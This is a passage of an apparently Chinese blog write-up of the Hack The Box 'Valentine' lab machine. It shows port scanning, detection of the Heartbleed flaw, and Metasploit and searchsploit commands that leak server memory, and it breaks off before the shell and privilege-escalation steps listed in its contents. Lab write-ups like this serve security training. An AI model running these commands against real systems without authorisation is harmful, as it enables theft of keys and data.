@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>HTB靶机 012 Valentine WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="author-link" content="">
+<meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='HTB, OSCP' /><meta itemprop="name" content="HTB靶机 012 Valentine WriteUp">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-05-01T19:55:27+08:00" />
+<meta itemprop="dateModified" content="2023-05-01T19:55:27+08:00" />
+<meta itemprop="wordCount" content="2587">
+<meta itemprop="keywords" content="HTB,OSCP," /><meta property="og:title" content="HTB靶机 012 Valentine WriteUp" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-012-valentine-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-01T19:55:27+08:00" />
+<meta property="article:modified_time" content="2023-05-01T19:55:27+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB靶机 012 Valentine WriteUp"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-012-valentine-writeup/" /><link rel="prev" href="https://www.bthoughts.top/posts/20230425-shellspawn/" /><link rel="next" href="https://www.bthoughts.top/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HTB靶机 012 Valentine WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-012-valentine-writeup\/"
+    },"genre": "posts","keywords": "HTB, OSCP","wordcount":  2587 ,
+    "url": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-012-valentine-writeup\/","datePublished": "2023-05-01T19:55:27+08:00","dateModified": "2023-05-01T19:55:27+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tools/"
+                
+                
+              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tools/"
+                  
+                  
+                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>HTB靶机 012 Valentine WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
+          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
+      <div class="post-meta-line"><span title=2023-05-01&#32;19:55:27><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-05-01">2023-05-01</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2587 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 6 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scan">Scan</a></li>
+    <li><a href="#heartbleed">Heartbleed</a>
+      <ul>
+        <li><a href="#msf">MSF</a></li>
+        <li><a href="#非msf">非MSF</a></li>
+      </ul>
+    </li>
+    <li><a href="#web扫描">Web扫描</a></li>
+    <li><a href="#初始shell">初始shell</a></li>
+    <li><a href="#root-shell">root shell</a>
+      <ul>
+        <li><a href="#cve-2021-4034">CVE-2021-4034</a></li>
+        <li><a href="#tmux提权">tmux提权</a></li>
+      </ul>
+    </li>
+    <li><a href="#end">END</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h1 id="012-valentine">012-Valentine</h1>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429004811139.png" srcset="/resource/012-Valentine.assets/image-20230429004811139.png, /resource/012-Valentine.assets/image-20230429004811139.png 1.5x, /resource/012-Valentine.assets/image-20230429004811139.png 2x" sizes="auto" data-title="image-20230429004811139" data-alt="image-20230429004811139" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>靶机IP：10.10.10.79</p>
+<h2 id="scan">Scan</h2>
+<p>nmap端口扫描：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sSV -T4 10.10.10.79 -F
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-29 00:47 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.79
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">97</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 28.88 seconds
+</span></span></code></pre></div><p>访问80、443端口都是如下一张图片：</p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429004953743.png" srcset="/resource/012-Valentine.assets/image-20230429004953743.png, /resource/012-Valentine.assets/image-20230429004953743.png 1.5x, /resource/012-Valentine.assets/image-20230429004953743.png 2x" sizes="auto" data-title="image-20230429004953743" data-alt="image-20230429004953743" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>通过图片联想到心脏滴血漏洞，使用nmap进行探测</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls /usr/share/nmap/scripts <span class="p">|</span> grep ssl             
+</span></span><span class="line"><span class="cl">rmi-vuln-classloader.nse
+</span></span><span class="line"><span class="cl">ssl-ccs-injection.nse
+</span></span><span class="line"><span class="cl">ssl-cert-intaddr.nse
+</span></span><span class="line"><span class="cl">ssl-cert.nse
+</span></span><span class="line"><span class="cl">ssl-date.nse
+</span></span><span class="line"><span class="cl">ssl-dh-params.nse
+</span></span><span class="line"><span class="cl">ssl-enum-ciphers.nse
+</span></span><span class="line"><span class="cl">ssl-heartbleed.nse
+</span></span><span class="line"><span class="cl">ssl-known-key.nse
+</span></span><span class="line"><span class="cl">ssl-poodle.nse
+</span></span><span class="line"><span class="cl">sslv2-drown.nse
+</span></span><span class="line"><span class="cl">sslv2.nse
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sSV -T4 10.10.10.79 -p22,443 --script ssl-heartbleed.nse
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-29 00:54 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.79
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.32s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-heartbleed: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   VULNERABLE:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows <span class="k">for</span> stealing information intended to be protected by SSL/TLS encryption.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     State: VULNERABLE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Risk factor: High
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       OpenSSL versions 1.0.1 and 1.0.2-beta releases <span class="o">(</span>including 1.0.1f and 1.0.2-beta1<span class="o">)</span> of OpenSSL are affected by the Heartbleed bug. The bug allows <span class="k">for</span> reading memory of systems protected by the vulnerable OpenSSL versions and could allow <span class="k">for</span> disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://cvedetails.com/cve/2014-0160/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://www.openssl.org/news/secadv_20140407.txt 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-0160
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.19 seconds
+</span></span></code></pre></div><p>探测结果说明心脏滴血漏洞存在。</p>
+<p>之后先针对心脏滴血漏洞进行利用，同时扫描全端口，看看有没有忽略的信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sSV -T4 10.10.10.79 -p-
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-29 15:24 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.79
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65525</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE      VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open     ssh          OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open     http         Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">443/tcp   open     ssl/http     Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">1983/tcp  filtered lhtp
+</span></span><span class="line"><span class="cl">2028/tcp  filtered submitserver
+</span></span><span class="line"><span class="cl">19156/tcp filtered unknown
+</span></span><span class="line"><span class="cl">20316/tcp filtered unknown
+</span></span><span class="line"><span class="cl">28245/tcp filtered unknown
+</span></span><span class="line"><span class="cl">50399/tcp filtered unknown
+</span></span><span class="line"><span class="cl">55915/tcp filtered unknown
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1181.61 seconds
+</span></span></code></pre></div><p>使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。</p>
+<h2 id="heartbleed">Heartbleed</h2>
+<h3 id="msf">MSF</h3>
+<p>利用MSF进行漏洞利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfconsole                                                                              
+</span></span><span class="line"><span class="cl">msf6 &gt; search heartbleed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                              Disclosure Date  Rank    Check  Description</span>
+</span></span><span class="line"><span class="cl">   -  ----                                              ---------------  ----    -----  -----------
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat <span class="o">(</span>Heartbleed<span class="o">)</span> Client Memory Exposure
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat <span class="o">(</span>Heartbleed<span class="o">)</span> Information Leak
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 1, use <span class="m">1</span> or use auxiliary/scanner/ssl/openssl_heartbleed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; use auxiliary/scanner/ssl/openssl_heartbleed 
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.79
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.79
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.10.79:443       - Heartbeat response with leak, <span class="m">65535</span> bytes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> &gt; <span class="nb">set</span> VERBOSE True
+</span></span><span class="line"><span class="cl"><span class="nv">VERBOSE</span> <span class="o">=</span>&gt; <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/ssl/openssl_heartbleed<span class="o">)</span> &gt; exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Leaking heartbeat response <span class="c1">#1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Sending Client Hello...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - SSL record <span class="c1">#1:</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429155205097.png" srcset="/resource/012-Valentine.assets/image-20230429155205097.png, /resource/012-Valentine.assets/image-20230429155205097.png 1.5x, /resource/012-Valentine.assets/image-20230429155205097.png 2x" sizes="auto" data-title="image-20230429155205097" data-alt="image-20230429155205097" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429155239318.png" srcset="/resource/012-Valentine.assets/image-20230429155239318.png, /resource/012-Valentine.assets/image-20230429155239318.png 1.5x, /resource/012-Valentine.assets/image-20230429155239318.png 2x" sizes="auto" data-title="image-20230429155239318" data-alt="image-20230429155239318" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/resource/012-Valentine.assets/image-20230429155329208.png" srcset="/resource/012-Valentine.assets/image-20230429155329208.png, /resource/012-Valentine.assets/image-20230429155329208.png 1.5x, /resource/012-Valentine.assets/image-20230429155329208.png 2x" sizes="auto" data-title="image-20230429155329208" data-alt="image-20230429155329208" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。</p>
+<h3 id="非msf">非MSF</h3>
+<p>搜索EXP：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit heartbleed                                            
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                                                           <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">OpenSSL 1.0.1f TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure <span class="o">(</span>Multiple SSL/TLS Versions<span class="o">)</span>      <span class="p">|</span> multiple/remote/32764.py
+</span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Information Leak <span class="o">(</span>1<span class="o">)</span>                                      <span class="p">|</span> multiple/remote/32791.c
+</span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Information Leak <span class="o">(</span>2<span class="o">)</span> <span class="o">(</span>DTLS Support<span class="o">)</span>                       <span class="p">|</span> multiple/remote/32998.c
+</span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure                                         <span class="p">|</span> multiple/remote/32745.py
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></div><p>找个利用脚本进行利用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -m multiple/remote/32764.py
+</span></span><span class="line"><span class="cl">  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure <span class="o">(</span>Multiple SSL/TLS Versions<span class="o">)</span>
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/32764
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
+</span></span><span class="line"><span class="cl">    Codes: CVE-2014-0346, CVE-2014-0160, OSVDB-105465
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable
+</span></span><span class="line"><span class="cl">Copied to: /home/xavier/Desktop/HTB/012-Valentine/32764.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
